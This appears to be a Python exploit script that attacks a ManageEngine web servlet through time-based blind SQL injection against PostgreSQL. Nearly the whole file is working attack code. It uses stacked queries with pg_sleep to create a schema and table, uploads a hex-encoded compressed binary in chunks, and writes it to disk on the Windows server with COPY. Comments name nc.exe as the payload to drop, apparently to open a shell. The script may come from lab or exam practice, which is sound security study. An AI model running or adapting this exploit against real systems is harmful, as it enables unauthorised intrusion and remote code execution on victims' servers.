import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bsqli.queries import QUERIES
from bsqli.bsqli import blind_query
from bsqli.bsqli import question
from bsqli.bsqli import get_length
from bsqli.bsqli import get_count
from bsqli.bsqli import binary_search
from bsqli.bsqli import get_string

req = lambda url: requests.get(url, verify=False)
conditional_error = lambda response: response.elapsed.total_seconds() >= 10
# SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

url = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
query_encoder_0 = lambda s: s.replace(' ','+')
query_encoder_1 = lambda s: s.replace('\'','$$')

#file = open('./nc-hex-compressed.txt', 'r')
file = open('./whoami-hex-compressed.txt', 'r')
file_data=file.read()
file.close()
n = 200 # chunk length
chunks = [file_data[i:i+n] for i in range(0, len(file_data), n)]
print(len(chunks))
schema_name='nippy'
table_name='zinhart'

#print(chunks[len(chunks)- 4])
for chunk in chunks:
    print(chunk)
# Writing a binary to disk via sqli
# First request: create a table to hold the hex characters
inj = lambda url, sub_query, comment: F"{url};CREATE SCHEMA {schema_name};create table {schema_name}.{table_name}(content text);SELECT CASE WHEN ({sub_query}) THEN pg_sleep(10) ELSE pg_sleep(0) END;{comment}"
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=inj,
    sub_query='1=1',
    query_encoder=query_encoder_0,
    comment="-- ",
    debug=True
)
print(F'Table Created?: {ret}')

# Second to Nth request: insert a row of n bytes into the string
bin_payload = []
for chunk in chunks:
    inj = lambda url, sub_query, comment: query_encoder_1(F"{url};INSERT INTO {schema_name}.{table_name}(content) VALUES('{chunk}');{comment}")
    ret = blind_query(
        req=req,
        sqli_truth_condition=conditional_error,
        url=url,
        base_query=inj,
        sub_query='1=1',
        query_encoder=query_encoder_0,
        comment="-- ",
        debug=False
    )

# Nth + 1 request: concatenate rows into one string and write to disk. Keep in mind that the max length string 
# text data type can hold is 65,535 bytes. Using upx -9 on nc.exe yields a hex string of 59,392 bytes so not much room to work with.

inj = lambda url, sub_query, comment: query_encoder_1(F"{url};copy (select string_agg({schema_name}.{table_name}.content, '') from {schema_name}.{table_name}) to 'C:\\test.txt';{comment}")
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=inj,
    sub_query='1=1',
    query_encoder=query_encoder_0,
    comment="-- ",
    debug=True
)
#print(F'Table Created?: {ret}')